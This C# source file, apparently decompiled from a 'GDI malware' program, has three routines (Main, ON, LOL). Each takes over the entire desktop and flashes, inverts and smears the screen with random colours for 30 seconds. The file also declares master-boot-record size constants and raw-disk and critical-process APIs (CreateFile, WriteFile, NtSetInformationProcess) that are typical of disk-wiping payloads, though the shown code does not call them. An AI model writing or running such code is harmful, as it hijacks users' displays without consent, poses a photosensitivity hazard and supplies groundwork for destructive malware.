using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace YYY;

internal class COLOR
{
	private enum TernaryRasterOperations : uint
	{
		SRCCOPY = 13369376u,
		SRCPAINT = 15597702u,
		SRCAND = 8913094u,
		SRCINVERT = 6684742u,
		SRCERASE = 4457256u,
		NOTSRCCOPY = 3342344u,
		NOTSRCERASE = 1114278u,
		MERGECOPY = 12583114u,
		MERGEPAINT = 12255782u,
		PATCOPY = 15728673u,
		PATPAINT = 16452105u,
		PATINVERT = 5898313u,
		DSTINVERT = 5570569u,
		BLACKNESS = 66u,
		WHITENESS = 16711778u,
		CAPTUREBLT = 1073741824u
	}

	public struct POINT
	{
		public int X;

		public int Y;

		public POINT(int x, int y)
		{
			X = x;
			Y = y;
		}

		public static implicit operator Point(POINT p)
		{
			return new Point(p.X, p.Y);
		}

		public static implicit operator POINT(Point p)
		{
			return new POINT(p.X, p.Y);
		}
	}

	public struct BLENDFUNCTION
	{
		private byte BlendOp;

		private byte BlendFlags;

		private byte SourceConstantAlpha;

		private byte AlphaFormat;

		public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
		{
			BlendOp = op;
			BlendFlags = flags;
			SourceConstantAlpha = alpha;
			AlphaFormat = format;
		}
	}

	private const uint GenericRead = 2147483648u;

	private const uint GenericWrite = 1073741824u;

	private const uint GenericExecute = 536870912u;

	private const uint GenericAll = 268435456u;

	private const uint FileShareRead = 1u;

	private const uint FileShareWrite = 2u;

	private const uint OpenExisting = 3u;

	private const uint FileFlagDeleteOnClose = 67108864u;

	private const uint MbrSize = 512u;

	private const int AC_SRC_OVER = 0;

	private const int AC_SRC_ALPHA = 1;

	[DllImport("Shell32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "ExtractIconExW", ExactSpelling = true)]
	private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("gdi32.dll", SetLastError = true)]
	private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject(IntPtr hObject);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

	[DllImport("gdi32.dll")]
	private static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	private static extern IntPtr GetWindowDC(IntPtr hwnd);

	[DllImport("user32.dll")]
	private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

	[DllImport("User32.dll")]
	private static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(int crColor);

	[DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
	public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, BLENDFUNCTION blendFunction);

	[DllImport("gdi32.dll")]
	private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, TernaryRasterOperations dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, TernaryRasterOperations dwRop);

	[DllImport("gdi32.dll")]
	public static extern bool DeleteDC(IntPtr hdc);

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CloseHandle(IntPtr hHandle);

	public static Icon Extract(string file, int number, bool largeIcon)
	{
		ExtractIconEx(file, number, out var piLargeVersion, out var piSmallVersion, 1);
		try
		{
			return Icon.FromHandle(largeIcon ? piLargeVersion : piSmallVersion);
		}
		catch
		{
			return null;
		}
	}

	public static void Main()
	{
		Thread.Sleep(50);
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		int left = Screen.PrimaryScreen.Bounds.Left;
		int right = Screen.PrimaryScreen.Bounds.Right;
		int top = Screen.PrimaryScreen.Bounds.Top;
		int bottom = Screen.PrimaryScreen.Bounds.Bottom;
		uint[] array = new uint[5] { 16711680u, 16711868u, 65331u, 268433152u, 65519u };
		POINT[] array2 = new POINT[3];
		Icon val = Extract("shell32.dll", 232, largeIcon: true);
		while (DateTime.Now - now < timeSpan)
		{
			Random random = new Random();
			IntPtr desktopWindow = GetDesktopWindow();
			IntPtr windowDC = GetWindowDC(desktopWindow);
			IntPtr dC = GetDC(IntPtr.Zero);
			IntPtr intPtr = CreateSolidBrush(0);
			IntPtr hdc = CreateCompatibleDC(windowDC);
			IntPtr hgdiobj = CreateCompatibleBitmap(windowDC, width, height);
			IntPtr intPtr2 = SelectObject(hdc, hgdiobj);
			desktopWindow = GetDesktopWindow();
			windowDC = GetWindowDC(desktopWindow);
			intPtr = CreateSolidBrush(random.Next(100000000));
			SelectObject(windowDC, intPtr);
			BitBlt(windowDC, 0, 0, width, height, windowDC, 0, 0, TernaryRasterOperations.PATINVERT);
			DeleteObject(intPtr);
			DeleteDC(windowDC);
			Thread.Sleep(100);
		}
	}

	internal static void ON()
	{
		Thread.Sleep(50);
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		int left = Screen.PrimaryScreen.Bounds.Left;
		int right = Screen.PrimaryScreen.Bounds.Right;
		int top = Screen.PrimaryScreen.Bounds.Top;
		int bottom = Screen.PrimaryScreen.Bounds.Bottom;
		uint[] array = new uint[5] { 16711680u, 16711868u, 65331u, 268433152u, 65519u };
		POINT[] array2 = new POINT[3];
		Icon val = Extract("shell32.dll", 232, largeIcon: true);
		while (DateTime.Now - now < timeSpan)
		{
			Random random = new Random();
			IntPtr desktopWindow = GetDesktopWindow();
			IntPtr windowDC = GetWindowDC(desktopWindow);
			IntPtr dC = GetDC(IntPtr.Zero);
			IntPtr intPtr = CreateSolidBrush(0);
			IntPtr hdc = CreateCompatibleDC(windowDC);
			IntPtr hgdiobj = CreateCompatibleBitmap(windowDC, width, height);
			IntPtr intPtr2 = SelectObject(hdc, hgdiobj);
			desktopWindow = GetDesktopWindow();
			windowDC = GetWindowDC(desktopWindow);
			intPtr = CreateSolidBrush(random.Next(100000000));
			SelectObject(windowDC, intPtr);
			BitBlt(windowDC, 0, 0, width, height, windowDC, 0, 0, TernaryRasterOperations.PATINVERT);
			DeleteObject(intPtr);
			DeleteDC(windowDC);
			Thread.Sleep(100);
		}
	}

	internal static void LOL()
	{
		Thread.Sleep(50);
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		int left = Screen.PrimaryScreen.Bounds.Left;
		int right = Screen.PrimaryScreen.Bounds.Right;
		int top = Screen.PrimaryScreen.Bounds.Top;
		int bottom = Screen.PrimaryScreen.Bounds.Bottom;
		uint[] array = new uint[5] { 16711680u, 16711868u, 65331u, 268433152u, 65519u };
		POINT[] array2 = new POINT[3];
		Icon val = Extract("shell32.dll", 232, largeIcon: true);
		while (DateTime.Now - now < timeSpan)
		{
			Random random = new Random();
			IntPtr desktopWindow = GetDesktopWindow();
			IntPtr windowDC = GetWindowDC(desktopWindow);
			IntPtr dC = GetDC(IntPtr.Zero);
			IntPtr intPtr = CreateSolidBrush(0);
			IntPtr hdc = CreateCompatibleDC(windowDC);
			IntPtr hgdiobj = CreateCompatibleBitmap(windowDC, width, height);
			IntPtr intPtr2 = SelectObject(hdc, hgdiobj);
			desktopWindow = GetDesktopWindow();
			windowDC = GetWindowDC(desktopWindow);
			intPtr = CreateSolidBrush(random.Next(100000000));
			SelectObject(windowDC, intPtr);
			BitBlt(windowDC, 0, 0, width, height, windowDC, 0, 0, TernaryRasterOperations.PATINVERT);
			BitBlt(windowDC, 1, 1, width, height, windowDC, 0, 0, TernaryRasterOperations.SRCERASE);
			BitBlt(windowDC, random.Next(-300, width), random.Next(-300, height), random.Next(width / 2), random.Next(height / 2), windowDC, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
			DeleteObject(intPtr);
			DeleteDC(windowDC);
			Thread.Sleep(50);
		}
	}
}
